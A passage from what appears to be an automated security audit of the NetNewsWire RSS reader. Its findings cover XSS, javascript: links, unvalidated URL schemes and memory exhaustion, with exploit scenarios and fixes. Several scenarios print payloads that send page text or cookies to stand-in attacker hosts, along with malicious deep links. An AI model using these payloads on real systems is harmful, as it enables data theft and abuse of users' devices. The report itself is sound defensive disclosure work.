  line 4:  [[feed_link_title]] and [[byline]] inside a <td>
  line 11: [[title]] inside <h1><a>
  line 12: [[datetime_medium]] inside <a>
  line 13: [[external_link_label]] and [[external_link_stripped]] inside a <div>

The `[[body]]` placeholder on line 14 is deliberately raw HTML (article body). This architectural choice means the template engine almost certainly performs unescaped string substitution globally. If that is the case, a feed that sets its title to `<script>…</script>` or `<img src=x onerror=…>` will cause that script to execute immediately when the article view is rendered, before any user interaction.

#### Impact
A malicious feed can embed HTML/script tags in its title, byline, external-link label, or feed title. If the Swift rendering layer does raw string substitution without HTML-escaping these metadata fields, the injected markup executes as soon as the article is rendered in the WKWebView — no user click required.

#### Exploit scenario
An attacker operates an RSS feed where the channel `<title>` is set to `<img src=x onerror="window.webkit.messageHandlers.articleExtractor.postMessage({action:'openURL',url:'javascript:evil()'});">`. When a subscribed NetNewsWire user navigates to any article from that feed, the rendered template substitutes the malicious title into line 11, the `onerror` handler fires on page load, and the injected script can call native message handlers without any click interaction.

#### Preconditions
- Attacker controls or compromises an RSS/Atom feed the victim subscribes to
- The Swift rendering code that substitutes [[title]], [[byline]], [[feed_link_title]], [[external_link_label]], and [[external_link_stripped]] does not HTML-encode special characters before injection

```
<td class="leftAlign"><a class="feedlink" href="[[feed_link]]">[[feed_link_title]]</a><br />[[byline]]</td>
...
<div class="articleTitle"><h1><a href="[[preferred_link]]">[[title]]</a></h1></div>
<div class="externalLink">[[external_link_label]] <a href="[[external_link]]">[[external_link_stripped]]</a></div>
```

#### How to fix
All template placeholders that carry metadata strings (title, byline, feed title, labels, stripped URLs, datetime) must be HTML-entity-encoded before substitution into the template — replacing `<`, `>`, `"`, `'`, and `&` with their respective HTML entities. Only `[[body]]` should remain raw (and its HTML must be separately sanitized via an allow-list sanitizer to strip script tags, event handler attributes, etc.). Apply this encoding at the single point in the Swift rendering code where `[[variable]]` replacement occurs.

**Exploitability:** Sepia theme injects multiple unencoded feed metadata fields (title, byline, external_link_stripped) into HTML text positions. A feed title of '<script>…</script>' or '<img src=x onerror=…>' executes on article render. CVSS 6.1. Multiple fields are injection points simultaneously, making exploitation trivial for any feed operator.

#### Adversarial verification
**Verdict:** TRUE_POSITIVE (confidence: 9/10) — `feed_link_title` (RSS channel title) and `byline` (author name) are substituted into HTML without encoding by `MacroProcessor`; JavaScript is enabled by default in the article WKWebView; no CSP is present; injected scripts can exfiltrate article content or invoke native message handlers.

I now have all the evidence I need. Let me compile the full analysis.

**Analysis**

**A. Template & substitution engine (confirmed)**
`MacroProcessor.processMacros()` (RSCore/Sources/RSCore/MacroProcessor.swift:57-85) performs **pure string-find-and-replace** with zero HTML encoding. Every `[[key]]` placeholder is replaced with the raw value from the `substitutions` dictionary.

**B. Each field's encoding path**

| Placeholder | Source | HTML-encoded before substitution? |
|---|---|---|
| `[[title]]` | `ArticleStringFormatter.sanitizedTitle(article?.title, forHTML: true)` | **YES** – non-whitelisted tags become `&lt;tag&gt;` |
| `[[feed_link_title]]` | `article.feed?.nameForDisplay` (raw RSS channel `<title>`) | **NO** |
| `[[byline]]` | `author.name` or `name.htmlByAddingLink(url)` = `<a href="url">NAME</a>` | **NO** – `name` unencoded in both the bare and href-wrapped branches |
| `[[external_link_stripped]]` | `externalLink.strippingHTTPOrHTTPSScheme` (only strips `http://`/`https://`) | **NO** |
| `[[datetime_medium]]` | `DateFormatter` output | Safe – dates can't contain HTML |
| `[[external_link_label]]` | `NSLocalizedString("Link:")` | Safe – static string |

The scanner's claim about `[[title]]` is wrong — it is protected. But `[[feed_link_title]]` and `[[byline]]` are genuine sinks.

**C. Defences searched for**

- **CSP**: Neither `Mac/MainWindow/Detail/page.html` nor `iOS/Resources/page.html` contains a `Content-Security-Policy` meta tag. No server headers apply (content is loaded via `webView.loadHTMLString(html, baseURL: ArticleRenderer.page.baseURL)`).
- **JavaScript disabled**: `Mac/AppDefaults.swift:347` and `iOS/AppDefaults.swift:401` register the default: `Key.articleContentJavascriptEnabled: true`. JavaScript is **on by default**.
- **ATS disabled**: `NSAllowsArbitraryLoads: true` in both platform plists — injected scripts can exfiltrate data over plain HTTP.
- **WKWebView sandbox**: The native message handlers registered (`imageWasClicked`, `imageWasShown`, `showFeedInspector`) are callable by injected scripts; they enable limited UI manipulation and image view transitions. They don't directly expose credentials, but combined with fetch-based exfiltration, the data exposure is real.

**D. Concrete exploit path**

1. Attacker serves an RSS feed with `<channel><title><img src=x onerror="fetch('https://attacker.com/x?d='+encodeURIComponent(document.body.innerText))"></title>` (or author name in `<author><name>`).
2. Victim subscribes and opens any article.
3. `feed_link_title` substitution inserts the raw string into the `<a>` text node.
4. `WebView.loadHTMLString` renders it with JS enabled → `onerror` fires → article text exfiltrated.

The `[[title]]` vector is **FALSE** (sanitized), but the finding is substantiated by `[[feed_link_title]]` and `[[byline]]`.

---

### 15. [MEDIUM] Unsanitized Feed Markdown Rendered as Arbitrary HTML
**Class:** CWE-79: Improper Neutralization of Input During Web Page Generation (Cross-site Scripting)
**CWE:** CWE-79: Improper Neutralization of Input During Web Page Generation (Cross-site Scripting) - https://cwe.mitre.org/data/definitions/79.html
**File:** `Modules/RSParser/Sources/RSParser/Feeds/ParsedItem.swift:69-74`
**CVSS 3.1:** **6.1** (Medium) — `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N`
**OffensivePriority:** **P3** - Internal Network / Privileged Position | *exposure unverified — no CMDB context; AV:N (network-routable; internet exposure unconfirmed)*
**Confidence:** 0.65 (1 run agreed)

#### Description
Data flow: (1) LocalAccountRefresher.refresh(_:) fetches a remote feed. (2) The RSS/Atom XML parser reads a `<source:markdown>` element (namespace matched by XMLNamespace.isSource) and stores its text content in RSSItem.markdown. (3) RSSItem.toParsedItem(feedURL:) constructs a ParsedItem passing markdown: markdown unchanged. (4) Inside ParsedItem.init(), at lines 69-74, `Tidemark.markdownToHTML(markdown)` is called with the fully attacker-controlled string. CommonMark-compliant markdown processors — including the Tidemark library used here — pass raw HTML blocks through unchanged per CommonMark §4.6. A feed item containing `<source:markdown><script>fetch('https://evil.com/?c='+document.cookie)</script></source:markdown>` therefore produces a contentHTML string containing a live `<script>` tag. (5) That string is stored in the articles database and later loaded into the article-viewer WKWebView. Because the WKWebView configuration accepts JavaScript (evidenced by the userContentController message-handler entry points listed in scope), the injected script executes in that context. No sanitisation or CSP is applied at the RSParser layer, and no downstream sanitisation path is visible in the provided slice.

#### Impact
An attacker who controls a feed URL can embed raw HTML (including `<script>` blocks) inside a `<source:markdown>` element. After Tidemark converts the markdown to HTML without removing inline HTML, the resulting content is stored in ParsedItem.contentHTML and rendered verbatim in the article-viewer WKWebView, which executes JavaScript based on the userContentController callbacks in scope. Any user subscribed to the malicious feed will have attacker scripts run in the article-viewer context.

#### Exploit scenario
An attacker registers a domain and publishes a valid RSS 2.0 feed containing an item with `<source:markdown xmlns:source="https://source.scripting.com/"><script>document.location='https://attacker.com/exfil?d='+encodeURIComponent(document.title)</script></source:markdown>`. A NetNewsWire user subscribes to this feed. On the next refresh LocalAccountRefresher fetches the feed, the XML parser captures the element value, RSSItem.toParsedItem passes it to ParsedItem.init, Tidemark.markdownToHTML emits the `<script>` block unchanged, and the resulting contentHTML is stored. When the user opens the article in the detail pane, the WKWebView renders the HTML and the script executes, exfiltrating context-accessible data to the attacker's server.

#### Preconditions
- User has subscribed to an attacker-controlled feed URL
- Tidemark.markdownToHTML passes raw HTML blocks through (CommonMark-compliant behavior; confirmed if Tidemark follows the CommonMark spec)

```
if let markdown {
    let rendered = Tidemark.markdownToHTML(markdown)
    self.contentHTML = rendered.isEmpty ? contentHTML : rendered
} else {
    self.contentHTML = contentHTML
}
```

#### How to fix
After calling Tidemark.markdownToHTML(), strip or escape any HTML that should not appear in rendered article content before assigning to self.contentHTML. The simplest correct fix is to apply an HTML sanitiser (allow-listing safe tags such as p, a, em, strong, code, pre, ul, ol, li, blockquote and removing script, style, iframe, on* attributes) to `rendered` before the assignment on line 71. Alternatively, configure the article-viewer WKWebView with a strict Content Security Policy (e.g., `script-src 'none'`) so that even if unsanitised markup reaches the view, inline scripts cannot execute.

**Exploitability:** source:markdown RSS extension passes attacker-controlled Markdown through Tidemark, which per CommonMark §4.6 passes raw HTML blocks unchanged. A feed item with '<script>…</script>' in the Markdown field delivers a live script tag into article contentHTML stored in the DB and rendered by WKWebView. CVSS 6.1 (AV:N/AC:L/PR:N/UI:R/S:C). Requires the source:markdown namespace, which limits real-world prevalence.

#### Adversarial verification
**Verdict:** TRUE_POSITIVE (confidence: 9/10) — end-to-end confirmed: attacker-controlled `source:markdown` feed element → `Tidemark.markdownToHTML()` (CommonMark HTML-block pass-through) → unsanitised HTML stored as `contentHTML` → rendered in WKWebView with JavaScript enabled by default and no CSP; message-handler bridge allows the injected script to cross from the WebContent process into the native app

I now have all the information needed for a complete assessment. Let me summarize my findings.

---

**Analysis**

**A. Cited Code — Confirmed**

`ParsedItem.swift` lines 69-74 exactly match the scanner's snippet:
```swift
if let markdown {
    let rendered = Tidemark.markdownToHTML(markdown)
    self.contentHTML = rendered.isEmpty ? contentHTML : rendered
} else {
    self.contentHTML = contentHTML
}
```
`Tidemark` is imported from `https://github.com/brentsimmons/Tidemark` (Package.swift line 14) — a CommonMark processor.

**B. Call Chain — Fully Traced**

1. **Network entry point**: `LocalAccountRefresher.refresh(_:)` fetches a remote RSS feed.
2. **Parser** (`RSSParser.swift` lines 222-226): `namespace.isSource && localName.equals("markdown")` → `article.markdown = parser.currentStringWithTrimmedWhitespace` — no validation.
3. **Conversion** (`RSSItem.swift` line 85): `markdown: markdown` passed to `ParsedItem.init()` unchanged.
4. **Rendering** (`ParsedItem.swift` lines 69-74): `Tidemark.markdownToHTML(markdown)` called on the attacker-supplied string.
5. **Template** (`ArticleRenderer.swift` → `template.html`): `d["body"] = body` → `[[body]]` inserted verbatim into the page.
6. **Render** (`DetailWebViewController.swift` line 320 / `WebViewController.swift` line 648): `webView.loadHTMLString(html, baseURL: ...)`.

CommonMark §4.6 HTML blocks: a CommonMark-compliant parser passes raw HTML through unaltered. `<script>` embedded in the markdown is emitted as-is.

**C. Defences — None Found**

| Defence | Result |
|---------|--------|
| JavaScript disabled? | **Default is `true`** — both `Mac/AppDefaults.swift:347` and `iOS/AppDefaults.swift:401` register `articleContentJavascriptEnabled: true` |
| Content-Security-Policy? | **None** — both `Mac/MainWindow/Detail/page.html` and `iOS/Resources/page.html` contain no `<meta http-equiv="Content-Security-Policy">` or CSP header |
| HTML sanitisation? | **None** — `ArticleRenderingSpecialCases.filterHTMLIfNeeded()` only rewrites mojibake characters for The Verge; no XSS stripping |
| Markdown HTML stripping? | Not present in this codebase; Tidemark is a standard CommonMark processor |
| Auth gate in front of feed parsing? | N/A — local account refresher requires no user gate beyond subscribing to the feed |

**D. Impact Scope**

Scripts in the WKWebView (WebContent process) can:
- Read the current article's DOM and exfiltrate it via `fetch`/`XMLHttpRequest` (NSAllowsArbitraryLoads:true, all origins permitted)
- Invoke registered `WKScriptMessageHandler` endpoints — notably `imageWasClicked` causes the **native app process** to download an attacker-specified URL (`Downloader.shared.download(imageURL)`), crossing the WebContent → App boundary
- Redirect the WKWebView to an attacker page

Scripts cannot directly escape the app sandbox, touch the Keychain, or access other articles in the database.

---

### 16. [MEDIUM] javascript: URI in href from untrusted feed data
**Class:** CWE-79: Improper Neutralization of Input During Web Page Generation (Cross-site Scripting)
**CWE:** CWE-79: Improper Neutralization of Input During Web Page Generation (Cross-site Scripting) - https://cwe.mitre.org/data/definitions/79.html
**File:** `Resources/Themes/Appanoose.nnwtheme/template.html:31-53`
**CVSS 3.1:** **6.1** (Medium) — `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N`
**OffensivePriority:** **P3** - Internal Network / Privileged Position | *exposure unverified — no CMDB context; AV:N (network-routable; internet exposure unconfirmed)*
**Confidence:** 0.75 (1 run agreed)
**Also at:** `Shared/Article Rendering/template.html:36-46`, `Themes/Biblioteca.nnwtheme/template.html:8`, `Themes/Appanoose.nnwtheme/template.html:31-53`, `Themes/Tiqoe Dark.nnwtheme/template.html:4-13`, `Themes/Verdana Revival.nnwtheme/template.html:6-29`, `Shared/Article Rendering/ArticleRenderer.swift:209-244`

*6 additional call site(s) collapsed during dedup — same root cause; each location needs the same fix applied.*

#### Description
All six theme templates place feed-supplied URLs directly into `href` attributes with no scheme allow-listing:

- Appanoose: `<a href="[[preferred_link]]">`, `<a href="[[feed_link]]">`, `<a href="[[external_link]]">` (lines 31, 38, 53)
- Biblioteca, Hyperlegible, NewsFax, Promenade, Sepia, Tiqoe Dark, Verdana Revival: identical patterns for `[[preferred_link]]`, `[[feed_link]]`, `[[external_link]]`.

Data flow: RSS item `<link>` → RSParser stores as `preferred_link` / `external_link` → Swift template substitution inserts verbatim → WKWebView renders `<a href="javascript:...">`. Clicking the link fires the JavaScript. The navigation-policy delegate (`webView(_:decidePolicyFor:decisionHandler:)`) is referenced in the trust model as an *entry point for untrusted data*, not necessarily as a `javascript:` scheme filter; its filtering behavior is unverifiable from this slice.

#### Impact
A feed can supply a `javascript:` URI as an article or feed link. When the user clicks the rendered link in any theme, the URI executes JavaScript in the WKWebView's page context. Attacker gains the same JS execution capability as the string-injection finding but gated on a user click.

#### Exploit scenario
A feed item sets `<link>javascript:window.webkit.messageHandlers.netnewswire.postMessage({action:'addFeed',url:'https://evil.com/feed.xml'})</link>`. NetNewsWire renders the article title as a clickable link in all themes. The user clicks "Read more" / the article title; the javascript: URI executes and sends a message to the native app handler.

#### Preconditions
- Victim subscribes to an attacker-controlled or compromised RSS feed
- Victim clicks a link within the rendered article
- The WKWebView navigation delegate does not explicitly block javascript: scheme (not verifiable from this slice)

```
<a class="feedlink" href="[[feed_link]]">[[feed_link_title]]</a>
<a href="[[preferred_link]]" class="nnwDateTime">
<a href="[[external_link]]">[[external_link_stripped]]</a>
```

#### How to fix
In the Swift template substitution engine, enforce an HTTPS/HTTP allow-list (or at minimum a `javascript:` block) on every value inserted into an `href`, `src`, or `action` attribute. A URL-scheme validator should reject any value that does not begin with `https://`, `http://`, or another explicitly permitted scheme before it reaches template substitution. Additionally, consider sanitizing all href-destined variables at the point where article data is written to the Article model rather than deferring to the WebView layer.

**Exploitability:** All six bundled themes place feed-supplied URLs (preferred_link, feed_link, external_link) into href attributes with no scheme allow-list. A javascript: URI in the feed link executes JS when the user clicks the rendered anchor; navigation-policy blocking of javascript: scheme is unconfirmed. CVSS 6.1 (AV:N/AC:L/PR:N/UI:R/S:C).

#### Adversarial verification
**Verdict:** TRUE_POSITIVE (confidence: 7/10) — iOS `decidePolicyFor` allows `javascript:` scheme (else-branch fallthrough); JavaScript enabled by default; feed-supplied `javascript:` hrefs execute in the article WKWebView. Mac is mitigated by unconditional `.cancel`. The specific `addFeed` exploit is wrong, but arbitrary JS execution in the webview (with limited native bridge access) is confirmed.

Now I have all the data needed for a complete analysis. Let me summarize the full investigation:

---

**Analysis**

**A. Template (lines 31, 38, 45, 53)**
Confirmed: `[[preferred_link]]`, `[[feed_link]]`, and `[[external_link]]` are inserted verbatim into `href` attributes by a Mustache-style substitution. No scheme filtering at the template layer. The scanner's description of the code is accurate.

**B. JavaScript is enabled by default**
Both `iOS/AppDefaults.swift:401` and `Mac/AppDefaults.swift:347` register `articleContentJavascriptEnabled: true` as the default, which propagates into `allowsContentJavaScript = true` on the `WKWebpagePreferences`. JavaScript execution is **on by default** in article views.

**C. Navigation delegates — the decisive difference**

**iOS (`WebViewController.swift` lines 405–454):** The delegate is a strict allow-list for `http`, `https`, `mailto`, and `tel`. Every other scheme, including `javascript:`, falls through to:
```swift
} else {
    decisionHandler(.allow)   // ← javascript: reaches this branch
}
```
When WKWebView calls `decidePolicyFor` with `navigationType == .linkActivated` for a `javascript:` href, this allows the navigation, causing WebKit to evaluate the script in the page context.

**Mac (`DetailWebViewController.swift` lines 205–215):** Every `linkActivated` navigation is cancelled (`decisionHandler(.cancel)`) regardless of scheme. The URL is forwarded to `Browser.open()`, but `NSWorkspace.shared.open(preparedURL, configuration: requiresUniversalLinks: true)` fails silently for `javascript:` (no universal-link handler), and even the fallback `MacWebBrowser.openURL` call to an external browser (Safari/Chrome/Firefox) discards `javascript:` URLs received from other processes. WKWebView never executes the script.

**D. Probing the defence — iOS path**

- `preparedForOpeningInBrowser()` (URL+RSWeb.swift): only replaces whitespace/`^`/`&amp;` — does **not** filter `javascript:`.
- No Content Security Policy is set on the loaded HTML — no `<meta http-equiv="Content-Security-Policy">` in any template file, and `loadHTMLString` doesn't inject one.
- No WKPreferences content-rule that blocks `javascript:` scheme navigations.
- The only protection on iOS is the scheme list in `decidePolicyFor`, which has the gap.

**E. What the JavaScript can actually do**

Available iOS message handlers: `imageWasClicked` (forces the app to download an attacker-supplied image URL via `Downloader.shared.download`), `imageWasShown` (fires a completion callback), `showFeedInspector` (pops the feed inspector UI). The scanner's claimed `netnewswire.postMessage({action:'addFeed',...})` handler **does not exist** — confirmed by grepping all `addScriptMessageHandler` calls. The real impact is: arbitrary downloads within the app sandbox, limited UI disruption, and DOM-level data access; critically it does NOT enable feed subscription.

**Verdict**

The scanner identified a real gap (no scheme allow-list → `javascript:` executes on iOS) but misidentified the exploit payload (the `netnewswire` handler is absent). The vulnerability is real on iOS and absent on macOS.

### 17. [MEDIUM] RSS feed link opens arbitrary iOS URL schemes without validation
**Class:** CWE-601: URL Redirection to Untrusted Site (Open Redirect)
**CWE:** CWE-601: URL Redirection to Untrusted Site (Open Redirect) - https://cwe.mitre.org/data/definitions/601.html
**File:** `iOS/Article/OpenInSafariActivity.swift:35-49`
**CVSS 3.1:** **6.1** (Medium) — `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N`
**OffensivePriority:** **P3** - Internal Network / Privileged Position | *exposure unverified — no CMDB context; AV:N (network-routable; internet exposure unconfirmed)*
**Confidence:** 0.85 (1 run agreed)

#### Description
The article URL originates from an RSS/Atom/JSON Feed <link> element — untrusted upstream producer input in the batch/ETL model. It flows through RSParser → Articles storage → WebViewController → UIActivityViewController. In OpenInBrowserActivity.prepare(withActivityItems:) at line 35-36, the raw URL is stored without scheme validation. OpenInBrowserActivity.perform() at line 46 passes it directly to UIApplication.shared.open(url, options: [:], completionHandler: nil) with no check that the scheme is http or https. iOS will dispatch any scheme registered on the device without further confirmation for most custom schemes.

#### Impact
A malicious RSS feed author can embed any URL scheme (tel:, facetime:, custom app deep links) as an article's permalink. When the user taps 'Open in Browser', the app triggers unintended actions in installed third-party apps or iOS system services on the user's device. The UX label 'Open in Browser' sets an expectation of http/https navigation that is not enforced in code.

#### Exploit scenario
Attacker publishes an RSS feed containing an article whose <link> element is 'facetime://victim@example.com' or 'googlepay://send?to=attacker&amount=100'. A subscriber opens the article in NetNewsWire, taps the share icon, and selects 'Open in Browser'. iOS immediately opens FaceTime or the payment app with the attacker-supplied parameters. For installed apps that handle custom URI schemes, no iOS confirmation dialog is shown; the app simply opens.

#### Preconditions
- User has subscribed to an attacker-controlled RSS/Atom/JSON feed
- User explicitly taps the share button on an article
- User explicitly selects 'Open in Browser' from the share sheet

```
override func perform() {
    guard let url = activityItems?.first(where: { $0 is URL }) as? URL else {
        activityDidFinish(false)
        return
    }
    Task { @MainActor in
        UIApplication.shared.open(url, options: [:], completionHandler: nil)  // no scheme check
    }
    activityDidFinish(true)
}
```

#### How to fix
At the start of perform(), validate that the URL uses only http or https schemes before calling UIApplication.open(). Add: `guard url.scheme == "http" || url.scheme == "https" else { activityDidFinish(false); return }` immediately after the existing guard at line 40. This preserves the 'Open in Browser' semantics and matches user expectation.

**Exploitability:** OpenInSafariActivity (iOS) stores the article URL (from RSS <link>) without scheme validation and passes it directly to UIApplication.shared.open. A tel:, sms:, facetime:, or custom deep-link URI in the feed invokes the corresponding handler without any warning when the user taps the Share action. CVSS 6.1 (AV:N/AC:L/PR:N/UI:R/S:C).

#### Adversarial verification
**Verdict:** TRUE_POSITIVE (confidence: 9/10) — unvalidated RSS `<link>` scheme flows through the full stack to `UIApplication.shared.open()` in `OpenInBrowserActivity.perform()` with no http/https guard anywhere in the chain, enabling arbitrary URI-scheme dispatch via a malicious feed.

**Verified data flow summary:**

1. **Source**: `Article.rawLink` is populated verbatim from the feed parser's `<link>` element with zero scheme constraints.  
2. **`URL.encodeSpacesIfNeeded`** (`URL+RSCore.swift:26-31`) only replaces spaces with `%20`; no scheme check.  
3. **`Article.preferredURL`** returns that URL directly.  
4. **`WebViewController.showActivityDialog()`** (line 308-311) passes the raw URL to the custom `UIActivityViewController(url:title:applicationActivities:)` initialiser.  
5. **`UIActivityViewController+Extras.swift`** wraps it in `ArticleActivityItemSource`, which returns the URL unchanged for every `activityType`.  
6. **`OpenInBrowserActivity.prepare()`** stores the item array, and `perform()` (line 46) calls `UIApplication.shared.open(url, options: [:], completionHandler: nil)` — no scheme guard, no allow-list, no sanitisation anywhere in the chain.

`UIApplication.shared.open()` is not subject to the `LSApplicationQueriesSchemes` restriction; it will dispatch any scheme to any registered handler on the device. For most custom URI schemes (FaceTime, Mail, payment apps, OAuth deep-links, etc.) iOS opens the target app immediately with no confirmation dialog.

The three preconditions (subscribe → tap share → tap "Open in Browser") are all normal user actions plausible in a social-engineering scenario targeting RSS readers.

### 18. [MEDIUM] Unvalidated theme `creatorHomePage` URL opened via NSAttributedString link
**Class:** CWE-601: URL Redirection to Untrusted Site (Open Redirect)
**CWE:** CWE-601: URL Redirection to Untrusted Site (Open Redirect) - https://cwe.mitre.org/data/definitions/601.html
**File:** `Mac/AppDelegate.swift:897-922`
**CVSS 3.1:** **6.1** (Medium) — `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N`
**OffensivePriority:** **P3** - Internal Network / Privileged Position | *exposure unverified — no CMDB context; AV:N (network-routable; internet exposure unconfirmed)*
**Confidence:** 0.78 (1 run agreed)

#### Description
Inside `importTheme(url:)`, after parsing the attacker-supplied theme file, the metadata field `theme.creatorHomePage` (sourced directly from the theme bundle's Info.plist, fully attacker-controlled) is assigned as a link attribute without any URL scheme validation: `attrs[.link] = theme.creatorHomePage` (line 921). The attribute is attached to displayed text in an NSTextView embedded in the install-confirmation NSAlert. An NSTextView with a link attribute, when clicked, calls `NSWorkspace.shared.open(_:)` with whatever URL or string was stored in the attribute. No allow-list or scheme restriction exists between the raw plist string and the open call.

#### Impact
An attacker-controlled `.nnwtheme` file can set `creatorHomePage` to any URL scheme. The value is placed directly into an NSAttributedString `NSAttributedString.Key.link` attribute displayed in the install-confirmation dialog. If the user clicks the link, NSTextView forwards it through NSWorkspace, which opens the URL — potentially launching arbitrary application URL schemes (e.g., `facetime://`, `zoommtg://`, `ssh://`, or OS-registered custom schemes) without any scheme allow-list check.

#### Exploit scenario
An attacker crafts a `.nnwtheme` bundle whose Info.plist contains `creatorHomePage = "zoommtg://zoom.us/join?action=join&confno=ATTACKER_MEETING&pwd=..."`  and distributes it. When the victim opens the file and NetNewsWire shows the install dialog with the displayed URL as a clickable link, clicking what looks like the author's website immediately joins an attacker-controlled meeting room. Substituting `facetime://victim@example.com` or a custom enterprise SSO URI equally demonstrates the issue.

#### Preconditions
- Attacker must deliver a `.nnwtheme` file to the victim (email, web download, shared folder).
- User must open the file in NetNewsWire, triggering the install dialog.
- User must click the displayed author-website link in the NSAlert accessory view.

```
attrs[.link] = theme.creatorHomePage   // raw, unvalidated plist string
websiteText.append(NSAttributedString(string: theme.creatorHomePage, attributes: attrs))
```

#### How to fix
Before assigning `theme.creatorHomePage` to `attrs[.link]`, validate the URL against an explicit scheme allow-list (e.g., `["https", "http"]`). Use `guard let url = URL(string: theme.creatorHomePage), url.scheme == "https" || url.scheme == "http" else { /* omit link or show plain text */ }`. Apply the same check in `ArticleTheme`'s initializer so that a malformed or scheme-disallowed URL is rejected at parse time.

**Exploitability:** macOS theme install dialog embeds the attacker-supplied creatorHomePage as an NSAttributedString .link attribute; clicking the link in the NSTextView passes the raw string to NSWorkspace.shared.open with no scheme restriction, opening tel:, custom://, or javascript: URIs. CVSS 6.1 (AV:N/AC:L/PR:N/UI:R/S:C). Requires one user click in the install-confirmation alert.

#### Adversarial verification
**Verdict:** TRUE_POSITIVE (confidence: 9/10) — `theme.creatorHomePage` is decoded from an attacker-controlled Info.plist with no scheme validation and assigned directly as an NSTextView `.link` attribute; clicking it invokes `NSWorkspace.shared.open()` with arbitrary URI schemes (zoommtg://, facetime://, custom enterprise SSO URIs), requiring only that the victim open the theme file and click the author-website link

Now I have everything I need. Let me analyze the full picture:

**A. What the code does:**
Lines 897–922 read a theme bundle, extract `theme.creatorHomePage` (a raw `String` decoded directly from the theme bundle's `Info.plist` via `PropertyListDecoder`), and assign it to `attrs[.link]` of an `NSAttributedString` shown in an `NSTextView` inside an `NSAlert`. The `NSTextView` has `isEditable = false` but link-click behavior is active by default — clicking opens the URL via `NSWorkspace.shared.open()`.

**B. Data origin:**
`ArticleTheme.init(url:isAppTheme:)` at `Shared/ArticleStyles/ArticleTheme.swift` line 80 decodes `Info.plist` with no pre-processing: `self.info = try PropertyListDecoder().decode(ArticleThemePlist.self, from: data)`. The `creatorHomePage` field is a plain `String` with no validation. The `.nnwtheme` bundle comes from a user-opened file, and `application(_:openFile:)` is listed as `[UNAUTH-REACHABLE]` — any delivered file triggers this path.

**C. Defences — none found:**
- No URL scheme allow-list (e.g., `https` / `http` only)
- No `URL(string:)` construction with scheme checking before assigning to `.link`
- No sandboxing of link opens in the NSTextView delegate
- The iOS path (`ArticleThemeImporter.swift` line 27–30) constructs `URL(string: theme.creatorHomePage)` and passes it directly to `UIApplication.shared.open()` — equally unvalidated

**D. Exploitability:**
- Attacker delivers a `.nnwtheme` zip/bundle (email, web download, AirDrop)
- Victim opens it → NetNewsWire shows the install dialog with a labeled "Author's website" link
- Victim clicks the link (natural action) → `NSWorkspace.shared.open("zoommtg://...")` joins an attacker Zoom meeting; `facetime://victim@example.com` initiates a FaceTime call; enterprise SSO deep-links can be abused similarly
- Two user interactions are needed (open file, click link), but both are low-friction and socially engineered by the scenario

The finding is confirmed as written. The attack crosses from NetNewsWire into arbitrary registered URL-scheme handlers with no validation.

### 19. [MEDIUM] Unbounded character buffer enables remote memory-exhaustion DoS
**Class:** CWE-400: Uncontrolled Resource Consumption
**CWE:** CWE-400: Uncontrolled Resource Consumption - https://cwe.mitre.org/data/definitions/400.html
**File:** `Modules/RSParser/Sources/RSParser/XML/XMLSAXParser.swift:356-364`
**CVSS 3.1:** **6.5** (Medium) — `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:N/A:H`
**OffensivePriority:** **P3** - Internal Network / Privileged Position | *exposure unverified — no CMDB context; AV:N (network-routable; internet exposure unconfirmed)*
**Confidence:** 0.93 (1 run agreed)

#### Description
XMLSAXParser.beginStoringCharacters() (line 99-105) initialises the mutable [UInt8] buffer with an optional 1024-byte reservation but imposes no upper bound. Both RSSDelegate and AtomDelegate call parser.beginStoringCharacters() for nearly every element start. XMLScanner.scanCDATA() (XMLScanner.swift:317) returns Array(input[start..<end]) — a full heap copy of the CDATA content. That array is then forwarded as the `bytes` argument to handleCharacters (XMLSAXParser.swift:361), which unconditionally appends every byte into charactersBuffer via append(contentsOf:). Later, currentStringWithTrimmedWhitespace decodes charactersBuffer into a Swift String, allocating yet another copy. No validation or size check sits between the network-delivered bytes and any of these allocation sites.

#### Impact
A malicious feed server can stream a feed containing megabytes of CDATA or plain text in a single element. The parser accumulates every byte in an uncapped [UInt8] buffer, then copies it again into a Swift String. Combined with earlier copies of the same data (Data → [UInt8] → CDATA heap slice → charactersBuffer → String), peak simultaneous allocation is roughly 5× the payload. On memory-constrained iOS devices this causes the OS to SIGKILL the app, and the crash recurs on every subsequent refresh attempt.

#### Exploit scenario
Attacker hosts https://evil.example/feed.xml containing <description><![CDATA[50 MB of padding]]></description>. When a user adds this feed, LocalAccountRefresher.refresh(_:) downloads it. FeedParser dispatches to RSSParser; parse(_ data:Data) calls Array(data) (+50 MB); XMLScanner.scanCDATA() returns another Array copy (+50 MB); RSSDelegate.beginStoringCharacters() enables accumulation; handleCharacters appends into charactersBuffer (+50 MB); currentStringWithTrimmedWhitespace creates a String (+50 MB). Peak ~200 MB for a 50 MB feed. iOS kills the process, and on the next automatic refresh the cycle repeats — permanently crash-looping that account's refresh.

#### Preconditions
- User must have subscribed to a feed URL controlled by the attacker
- No per-element content size cap is enforced between the download layer and the parser sink

```
func handleCharacters(_ bytes: [UInt8]) {
    guard !bytes.isEmpty else {
        return
    }
    if storingCharacters {
        charactersBuffer.append(contentsOf: bytes)  // no size cap
    }
    delegate?.xmlSAXParser(self, didFindCharacters: bytes[...])
}
```

#### How to fix
Add a configurable hard cap (e.g., 4 MB) to charactersBuffer. In handleCharacters(), guard before append: if storingCharacters && (charactersBuffer.count + bytes.count) <= maxCharactersBytes { charactersBuffer.append(contentsOf: bytes) } else { storingCharacters = false }. Additionally, XMLScanner.scanCDATA() should return ArraySlice<UInt8> pointing into the existing input buffer rather than Array(input[start..<end]) to eliminate the redundant copy.

**Exploitability:** XMLSAXParser appends all character data including CDATA into an unbounded [UInt8] buffer with no size cap. A feed element with a multi-GB text node exhausts device memory and crashes the app. CVSS 6.5 (AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:N/A:H). Triggered by subscribing to any malicious feed; no interaction beyond app refresh.

#### Adversarial verification
**Verdict:** TRUE_POSITIVE (confidence: 9/10) — confirmed unbounded heap accumulation from remote feed content, no size cap at any layer; crash-loops the app on iOS with a 50 MB malicious feed

I now have a complete picture of the full data flow. Let me summarize my findings:

---

**Analysis**

**A. Confirming the sink (XMLSAXParser.swift lines 356–364)**

